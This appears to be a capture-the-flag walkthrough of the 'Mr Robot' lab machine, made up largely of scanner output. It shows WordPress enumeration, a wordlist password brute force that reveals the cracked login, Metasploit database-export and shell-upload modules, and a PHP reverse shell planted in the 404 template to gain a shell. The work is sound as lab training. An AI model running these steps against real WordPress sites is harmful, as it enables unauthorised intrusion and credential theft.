 + http://192.168.118.187/admin/audio/feed/feed (CODE:301|SIZE:0)     
 + http://192.168.118.187/admin/audio/feed/index.php (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/admin/audio/feed/rdf/
 + http://192.168.118.187/admin/audio/feed/rss (CODE:301|SIZE:0)      
 + http://192.168.118.187/admin/audio/feed/rss2 (CODE:301|SIZE:0)     

 ---- Entering directory: http://192.168.118.187/admin/css/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/admin/css/feed/atom/
 + http://192.168.118.187/admin/css/feed/feed (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/css/feed/index.php (CODE:301|SIZE:0)  
 ==> DIRECTORY: http://192.168.118.187/admin/css/feed/rdf/  
 + http://192.168.118.187/admin/css/feed/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/admin/css/feed/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/admin/feed/atom/ ----
 + http://192.168.118.187/admin/feed/atom/atom (CODE:301|SIZE:0)      
 + http://192.168.118.187/admin/feed/atom/feed (CODE:301|SIZE:0)      
 + http://192.168.118.187/admin/feed/atom/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/feed/atom/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/feed/atom/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/feed/atom/rss2 (CODE:301|SIZE:0)      

 ---- Entering directory: http://192.168.118.187/admin/feed/rdf/ ----
 + http://192.168.118.187/admin/feed/rdf/atom (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/feed/rdf/feed (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/feed/rdf/index.php (CODE:301|SIZE:0)  
 + http://192.168.118.187/admin/feed/rdf/rdf (CODE:301|SIZE:0)        
 + http://192.168.118.187/admin/feed/rdf/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/admin/feed/rdf/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/admin/images/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/admin/images/feed/atom/        
 + http://192.168.118.187/admin/images/feed/feed (CODE:301|SIZE:0)    
 + http://192.168.118.187/admin/images/feed/index.php (CODE:301|SIZE:0)         
 ==> DIRECTORY: http://192.168.118.187/admin/images/feed/rdf/         
 + http://192.168.118.187/admin/images/feed/rss (CODE:301|SIZE:0)     
 + http://192.168.118.187/admin/images/feed/rss2 (CODE:301|SIZE:0)    

 ---- Entering directory: http://192.168.118.187/admin/images/headlines/ ----
 + http://192.168.118.187/admin/images/headlines/atom (CODE:301|SIZE:0)         
 ==> DIRECTORY: http://192.168.118.187/admin/images/headlines/feed/   
 + http://192.168.118.187/admin/images/headlines/index.php (CODE:301|SIZE:0)    
 + http://192.168.118.187/admin/images/headlines/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/images/headlines/rss (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/images/headlines/rss2 (CODE:301|SIZE:0)         

 ---- Entering directory: http://192.168.118.187/admin/images/question/ ----
 + http://192.168.118.187/admin/images/question/atom (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/admin/images/question/feed/    
 + http://192.168.118.187/admin/images/question/index.php (CODE:301|SIZE:0)     
 + http://192.168.118.187/admin/images/question/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/images/question/rss (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/images/question/rss2 (CODE:301|SIZE:0)

 ---- Entering directory: http://192.168.118.187/admin/js/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/admin/js/feed/atom/  
 + http://192.168.118.187/admin/js/feed/feed (CODE:301|SIZE:0)        
 + http://192.168.118.187/admin/js/feed/index.php (CODE:301|SIZE:0)   
 ==> DIRECTORY: http://192.168.118.187/admin/js/feed/rdf/   
 + http://192.168.118.187/admin/js/feed/rss (CODE:301|SIZE:0)         
 + http://192.168.118.187/admin/js/feed/rss2 (CODE:301|SIZE:0)        

 ---- Entering directory: http://192.168.118.187/admin/js/vendor/ ----
 + http://192.168.118.187/admin/js/vendor/atom (CODE:301|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/admin/js/vendor/feed/
 + http://192.168.118.187/admin/js/vendor/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/js/vendor/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/js/vendor/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/js/vendor/rss2 (CODE:301|SIZE:0)      

 ---- Entering directory: http://192.168.118.187/admin/video/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/admin/video/feed/atom/         
 + http://192.168.118.187/admin/video/feed/feed (CODE:301|SIZE:0)     
 + http://192.168.118.187/admin/video/feed/index.php (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/admin/video/feed/rdf/
 + http://192.168.118.187/admin/video/feed/rss (CODE:301|SIZE:0)      
 + http://192.168.118.187/admin/video/feed/rss2 (CODE:301|SIZE:0)     

 ---- Entering directory: http://192.168.118.187/audio/feed/atom/ ----
 + http://192.168.118.187/audio/feed/atom/atom (CODE:301|SIZE:0)      
 + http://192.168.118.187/audio/feed/atom/feed (CODE:301|SIZE:0)      
 + http://192.168.118.187/audio/feed/atom/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/audio/feed/atom/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/feed/atom/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/feed/atom/rss2 (CODE:301|SIZE:0)      

 ---- Entering directory: http://192.168.118.187/audio/feed/rdf/ ----
 + http://192.168.118.187/audio/feed/rdf/atom (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/feed/rdf/feed (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/feed/rdf/index.php (CODE:301|SIZE:0)  
 + http://192.168.118.187/audio/feed/rdf/rdf (CODE:301|SIZE:0)        
 + http://192.168.118.187/audio/feed/rdf/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/audio/feed/rdf/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/blog/feed/atom/ ----
 + http://192.168.118.187/blog/feed/atom/atom (CODE:301|SIZE:0)       
 + http://192.168.118.187/blog/feed/atom/feed (CODE:301|SIZE:0)       
 + http://192.168.118.187/blog/feed/atom/index.php (CODE:301|SIZE:0)  
 + http://192.168.118.187/blog/feed/atom/rdf (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/feed/atom/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/feed/atom/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/blog/feed/rdf/ ----
 + http://192.168.118.187/blog/feed/rdf/atom (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/feed/rdf/feed (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/feed/rdf/index.php (CODE:301|SIZE:0)   
 + http://192.168.118.187/blog/feed/rdf/rdf (CODE:301|SIZE:0)         
 + http://192.168.118.187/blog/feed/rdf/rss (CODE:301|SIZE:0)         
 + http://192.168.118.187/blog/feed/rdf/rss2 (CODE:301|SIZE:0)        

 ---- Entering directory: http://192.168.118.187/css/feed/atom/ ----
 + http://192.168.118.187/css/feed/atom/atom (CODE:301|SIZE:0)        
 + http://192.168.118.187/css/feed/atom/feed (CODE:301|SIZE:0)        
 + http://192.168.118.187/css/feed/atom/index.php (CODE:301|SIZE:0)   
 + http://192.168.118.187/css/feed/atom/rdf (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/feed/atom/rss (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/feed/atom/rss2 (CODE:301|SIZE:0)        

 ---- Entering directory: http://192.168.118.187/css/feed/rdf/ ----
 + http://192.168.118.187/css/feed/rdf/atom (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/feed/rdf/feed (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/feed/rdf/index.php (CODE:301|SIZE:0)    
 + http://192.168.118.187/css/feed/rdf/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/css/feed/rdf/rss (CODE:301|SIZE:0)
 + http://192.168.118.187/css/feed/rdf/rss2 (CODE:301|SIZE:0)         

 ---- Entering directory: http://192.168.118.187/image/0/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/image/0/feed/atom/   
 ^C> Testing: http://192.168.118.187/image/0/feed/bonus


 root@kali:~/mrrobt# nikto -host 192.168.118.187
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:192.168.118.187
 + Target Hostname:    192.168.118.187
 + Target Port:        80
 + Start Time:         2017-05-20 13:04:47 (GMT-6)
 ---------------------------------------------------------------------------
 + Server: Apache
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Retrieved x-powered-by header: PHP/5.5.29
 + No CGI Directories found (use '-C all' to force check all possible dirs)
 + Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
 + Uncommon header 'tcn' found, with contents: list
 + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
 + OSVDB-3092: /admin/: This might be interesting...
 + Uncommon header 'link' found, with contents: <http://192.168.118.187/?p=23>; rel=shortlink
 + /readme.html: This WordPress file reveals the installed version.
 + /wp-links-opml.php: This WordPress script reveals the installed version.
 + OSVDB-3092: /license.txt: License file found may identify site software.
 + /admin/index.html: Admin login page/section found.
 + Cookie wordpress_test_cookie created without the httponly flag
 + /wp-login/: Admin login page/section found.
 + /wordpress/: A Wordpress installation was found.
 + /wp-admin/wp-login.php: Wordpress login found
 + /blog/wp-login.php: Wordpress login found
 + /wp-login.php: Wordpress login found
 + 7535 requests: 0 error(s) and 18 item(s) reported on remote host
 + End Time: 2017-05-20 13:07:11 (GMT-6) (144 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested


 root@kali:~/mrrobt# nikto -host https://192.168.118.187
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:192.168.118.187
 + Target Hostname:    192.168.118.187
 + Target Port:        443
 ---------------------------------------------------------------------------
 + SSL Info:        Subject:  /CN=www.example.com
Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
Issuer:   /CN=www.example.com
 + Start Time:         2017-05-20 13:12:01 (GMT-6)
 ---------------------------------------------------------------------------
 + Server: Apache
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Retrieved x-powered-by header: PHP/5.5.29
 + No CGI Directories found (use '-C all' to force check all possible dirs)
 + Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
 + The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
 + Uncommon header 'tcn' found, with contents: list
 + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
 + Hostname '192.168.118.187' does not match certificate's names: www.example.com
 + OSVDB-3092: /admin/: This might be interesting...
 + Uncommon header 'link' found, with contents: <https://192.168.118.187/?p=23>; rel=shortlink
 + /readme.html: This WordPress file reveals the installed version.
 + /wp-links-opml.php: This WordPress script reveals the installed version.
 + OSVDB-3092: /license.txt: License file found may identify site software.
 + /admin/index.html: Admin login page/section found.
 + Cookie wordpress_test_cookie created without the secure flag
 + Cookie wordpress_test_cookie created without the httponly flag
 + /wp-login/: Admin login page/section found.
 + /wordpress/: A Wordpress installation was found.
 + /wp-admin/wp-login.php: Wordpress login found
 + /blog/wp-login.php: Wordpress login found
 + /wp-login.php: Wordpress login found
 + 7535 requests: 0 error(s) and 22 item(s) reported on remote host
 + End Time: 2017-05-20 13:14:43 (GMT-6) (162 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested

root@kali:~/mrrobt# nmap --script http-methods -p 80 192.168.118.187

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-20 13:30 MDT
Nmap scan report for 192.168.118.187
Host is up (0.00054s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:83:A2:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
root@kali:~/mrrobt# nmap --script http-methods -p 443 192.168.118.187

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-20 13:30 MDT
Nmap scan report for 192.168.118.187
Host is up (0.00055s latency).
PORT    STATE SERVICE
443/tcp open  https
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:83:A2:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds

root@kali:~/mrrobt# curl http://192.168.118.187/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

root@kali:~/mrrobt# curl http://192.168.118.187/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9

oot@kali:~/mrrobt# curl -O http://192.168.118.187/fsocity.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0  67.8M      0 --:--:-- --:--:-- --:--:-- 68.4M

Now I have a key and a dictionary file.  The wordlist has some specific words in it.

root@kali:/usr/share/webshells/php# wpscan --url 192.168.118.187 -e vp u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.118.187/
[+] Started: Sat May 20 13:44:15 2017

[+] robots.txt available under: 'http://192.168.118.187/robots.txt'
[!] The WordPress 'http://192.168.118.187/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.118.187/xmlrpc.php

[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:01:14 <===============================================================> (1500 / 1500) 100.00% Time: 00:01:14

[+] We found 7 plugins:

[+] Name: akismet
 |  Latest version: 3.3.2
 |  Location: http://192.168.118.187/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: all-in-one-seo-pack - v2.0.4
 |  Location: http://192.168.118.187/wp-content/plugins/all-in-one-seo-pack/
 |  Readme: http://192.168.118.187/wp-content/plugins/all-in-one-seo-pack/readme.txt
[!] The version is out of date, the latest version is 2.3.12.5

[!] Title: All in One SEO Pack <= 2.1.5 - aioseop_functions.php new_meta Parameter XSS
    Reference: https://wpvulndb.com/vulnerabilities/6888
    Reference: http://blog.sucuri.net/2014/05/vulnerability-found-in-the-all-in-one-seo-pack-wordpress-plugin.html
[i] Fixed in: 2.1.6

[!] Title: All in One SEO Pack <= 2.1.5 - Unspecified Privilege Escalation
    Reference: https://wpvulndb.com/vulnerabilities/6889
    Reference: http://blog.sucuri.net/2014/05/vulnerability-found-in-the-all-in-one-seo-pack-wordpress-plugin.html
[i] Fixed in: 2.1.6

[!] Title: All in One SEO Pack <= 2.2.5.1 - Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/7881
    Reference: http://jvn.jp/en/jp/JVN75615300/index.html
    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0902
[i] Fixed in: 2.2.6

[!] Title: All in One SEO Pack <= 2.2.6.1 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7916
    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
[i] Fixed in: 2.2.6.2

[!] Title: All in One SEO Pack <= 2.3.6.1 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8538
    Reference: http://seclists.org/fulldisclosure/2016/Jul/23
    Reference: https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_all_in_one_seo_pack_wordpress_plugin.html
    Reference: https://wptavern.com/all-in-one-seo-2-3-7-patches-persistent-xss-vulnerability
    Reference: https://www.wordfence.com/blog/2016/07/xss-vulnerability-all-in-one-seo-pack-plugin/
[i] Fixed in: 2.3.7

[!] Title: All in One SEO Pack <= 2.3.7 -  Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8558
    Reference: https://www.wordfence.com/blog/2016/07/new-xss-vulnerability-all-in-one-seo-pack/
    Reference: https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
[i] Fixed in: 2.3.8

[+] Name: all-in-one-wp-migration - v2.0.4
 |  Location: http://192.168.118.187/wp-content/plugins/all-in-one-wp-migration/
 |  Readme: http://192.168.118.187/wp-content/plugins/all-in-one-wp-migration/readme.txt
[!] The version is out of date, the latest version is 6.45

[!] Title: All-in-One WP Migration <= 2.0.4 - Unauthenticated Database Export
    Reference: https://wpvulndb.com/vulnerabilities/7857
    Reference: http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability
    Reference: https://www.rapid7.com/db/modules/auxiliary/gather/wp_all_in_one_migration_export
[i] Fixed in: 2.0.5

[+] Name: google-analytics-for-wordpress - v5.3.2
 |  Location: http://192.168.118.187/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.118.187/wp-content/plugins/google-analytics-for-wordpress/readme.txt
[!] The version is out of date, the latest version is 6.1.10

[!] Title: Google Analytics by Yoast <= 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
[i] Fixed in: 5.3.3

[!] Title: Google Analytics by Yoast <= 5.3.2 - Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7856
    Reference: https://yoast.com/ga-plugin-security-update-more/
    Reference: http://klikki.fi/adv/yoast_analytics.html
    Reference: http://packetstormsecurity.com/files/130935/
[i] Fixed in: 5.3.3

[!] Title: Google Analytics by Yoast <= 5.3.3 - Unauthenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7914
    Reference: https://yoast.com/coordinated-security-release/
    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
    Reference: http://klikki.fi/adv/yoast_analytics2.html
[i] Fixed in: 5.4

[!] Title: Google Analytics by Yoast <= 5.4.4 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8147
    Reference: https://security.dxw.com/advisories/xss-in-google-analytics-by-yoast-premium-by-privileged-users/
[i] Fixed in: 5.4.5

[+] Name: google-sitemap-generator - v4.0.7.1
 |  Location: http://192.168.118.187/wp-content/plugins/google-sitemap-generator/
 |  Readme: http://192.168.118.187/wp-content/plugins/google-sitemap-generator/readme.txt
[!] The version is out of date, the latest version is 4.0.8

[!] Title: Google XML Sitemaps - Authenticated Reflected XSS (via HOST header)
    Reference: https://wpvulndb.com/vulnerabilities/8762
    Reference: https://plugins.trac.wordpress.org/browser/google-sitemap-generator/trunk/sitemap-ui.php#L1310

[+] Name: jetpack - v3.3.2
 |  Location: http://192.168.118.187/wp-content/plugins/jetpack/
 |  Readme: http://192.168.118.187/wp-content/plugins/jetpack/readme.txt
[!] The version is out of date, the latest version is 4.9

[!] Title: Jetpack 3.0-3.4.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7915
    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
    Reference: https://jetpack.me/2015/04/20/jetpack-3-4-3-coordinated-security-update/
[i] Fixed in: 3.4.3

[!] Title: Jetpack <= 3.5.2 - Unauthenticated DOM Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7964
    Reference: https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
[i] Fixed in: 3.5.3

[!] Title: Jetpack <= 3.7.0 - Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8201
    Reference: https://jetpack.me/2015/09/30/jetpack-3-7-1-and-3-7-2-security-and-maintenance-releases/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-jetpack.html
[i] Fixed in: 3.7.1

[!] Title: Jetpack <= 3.7.0 - Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8202
    Reference: https://jetpack.me/2015/09/30/jetpack-3-7-1-and-3-7-2-security-and-maintenance-releases/
[i] Fixed in: 3.7.1

[!] Title: Jetpack <= 3.9.1 - LaTeX HTML Element XSS
    Reference: https://wpvulndb.com/vulnerabilities/8472
    Reference: https://jetpack.com/2016/02/25/jetpack-3-9-2-maintenance-and-security-release/
    Reference: https://github.com/Automattic/jetpack/commit/dbc33b9105c4dbb0de81544e682a8b6d5ab7e446
[i] Fixed in: 3.9.2

[!] Title: Jetpack 2.0-4.0.2 - Shortcode Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8500
    Reference: https://jetpack.com/2016/05/27/jetpack-4-0-3-critical-security-update/
    Reference: http://wptavern.com/jetpack-4-0-3-patches-a-critical-xss-vulnerability
    Reference: https://blog.sucuri.net/2016/05/security-advisory-stored-xss-jetpack-2.html
[i] Fixed in: 4.0.3

[!] Title: Jetpack <= 4.0.3 - Multiple Vulnerabilities
    Reference: https://wpvulndb.com/vulnerabilities/8517
    Reference: https://jetpack.com/2016/06/20/jetpack-4-0-4-bug-fixes/
[i] Fixed in: 4.0.4

[+] Name: wptouch - v3.7.3
 |  Location: http://192.168.118.187/wp-content/plugins/wptouch/
 |  Readme: http://192.168.118.187/wp-content/plugins/wptouch/readme.txt
[!] The version is out of date, the latest version is 4.3.17

[!] Title: WPtouch Mobile Plugin <= 3.7.5.3 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7920
    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
[i] Fixed in: 3.7.6

[+] Finished: Sat May 20 13:45:39 2017
[+] Requests Done: 1580
[+] Memory used: 190.055 MB
[+] Elapsed time: 00:01:24



msf > use auxiliary/gather/wp_all_in_one_migration_export
msf auxiliary(wp_all_in_one_migration_export) > show options

Module options (auxiliary/gather/wp_all_in_one_migration_export):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   MAXTIME    300              yes       The maximum number of seconds to wait for the export to complete
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_all_in_one_migration_export) > set rhost 192.168.118.187
rhost => 192.168.118.187

msf auxiliary(wp_all_in_one_migration_export) > run

[*] Requesting website export...
[+] Backup archive saved to /root/.msf4/loot/20170520135112_default_192.168.118.187_wordpress.export_385329.zip
[*] Auxiliary module execution completed

Cool blank file.

Aim for the low hanging fruit and try some generic credentials for the wordpress admin.  That quickly revels the login page lets us know if the username is correct.  After some generic admin guesses I started on characters from the show.  elliot looks like a valid user.

I'm assuming the password is in the wordlist grabbed earlier.  I'm also assuming the password is at the bottom of the list.

root@kali:~/mrrobt# tac fsocity.dic > fsocity-tac.dic

root@kali:~/mrrobt# wpscan --disable-tls-checks --url https://192.168.118.187 --wordlist ~/mrrobt/fsocity-tac.dic --username elliot --threads 50
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.118.187/
[+] Started: Sat May 20 19:56:12 2017

[+] robots.txt available under: 'https://192.168.118.187/robots.txt'
[!] The WordPress 'https://192.168.118.187/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: https://192.168.118.187/xmlrpc.php

[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                     

  Brute Forcing 'elliot' Time: 00:00:00 <                                           > (1 / 858161)  0.00%  ETA: 74:01:59
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Sat May 20 19:56:14 2017
[+] Requests Done: 53
[+] Memory used: 71.289 MB
[+] Elapsed time: 00:00:01

Thank you tac!  Now it is time to get into the box.

msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf exploit(wp_admin_shell_upload) > set password ER28-0652
password => ER28-0652
msf exploit(wp_admin_shell_upload) > set username elliot
username => elliot
msf exploit(wp_admin_shell_upload) > set rhost 192.168.118.187
rhost => 192.168.118.187
msf exploit(wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 192.168.118.186:4444
[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
[*] Exploit completed, but no session was created.
msf exploit(wp_admin_shell_upload) > show options


Or....keep digging.  Turns out I don't know anything about WordPress, but there has to be a way to upload a file or create a custom page.

Appearance -> Editor will let me create custom pages.

root@kali:~/mrrobt# cp /usr/share/webshells/php/php-reverse-shell.php ~/mrrobt/
root@kali:~/mrrobt# cd ..
root@kali:~# mv mrrobt/ mrrobot
root@kali:~# cd mrrobot/
root@kali:~/mrrobot#

I'm going to try this reverse shell....and fix the name of my directory.

editing the 404 template to add the reverse shell and hitting a random page worked!  

$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ cat /proc/version
Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
$

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
